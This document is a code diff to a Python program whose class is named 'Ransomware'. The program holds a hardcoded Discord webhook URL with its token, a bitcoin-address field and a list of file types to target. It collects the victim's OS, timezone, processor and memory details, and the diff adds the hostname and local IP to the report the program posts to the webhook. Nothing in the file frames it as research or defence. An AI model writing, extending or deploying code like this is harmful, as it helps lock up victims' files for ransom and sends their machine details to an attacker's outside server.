@@ -21,7 +21,6 @@ from datetime import datetime
 import pytz
 import psutil
 import socket
-from Pillow import ImageGrab
 from datetime import datetime, timedelta
 
 # Initialize global variables
@@ -29,21 +28,14 @@ SPI_SETDESKWALLPAPER = 0x0014
 btcAdd = ""
 email = ""
 discordWebhook = "https://discord.com/api/webhooks/1213226208494624768/LaW1E7j2183RtaOqqfttCaQGvnOhEvi13Uu80L_UHgAmFeNXhDbAU3X-BMIWht5IP3Rk"
-# Get operating system information
 os_info = f"Operating System: {platform.system()} {platform.version()}"
-
-# Get current timezone
 current_timezone = datetime.now(pytz.timezone('UTC')).astimezone().tzinfo
 timezone_info = f"Timezone: {current_timezone}"
-
-# Get system architecture
 architecture_info = f"System Architecture: {platform.architecture()}"
-
-# Get processor information
 processor_info = f"Processor: {platform.processor()}"
-
-# Get memory (RAM) information
 memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
 fileTypes = ['.txt']
 '''
 otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
@@ -156,6 +148,8 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         architecture_info = f"System Architecture: {platform.architecture()}"
         processor_info = f"Processor: {platform.processor()}"
         memory_info = f"Total Memory: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
 
         data = {
             "embeds": [
@@ -168,6 +162,8 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                         f"```css\nUSERNAME: {self.userName}``` "
                         f"```css\nIP: {self.ip}``` "
                         f"```css\n{os_info}``` "
+                        f"```css\nHostname: {hostname}``` "
+                        f"```css\nLocal IP: {ip_address}``` "
                         f"```css\n{timezone_info}``` "
                         f"```css\n{architecture_info}``` "
                         f"```css\n{processor_info}``` "
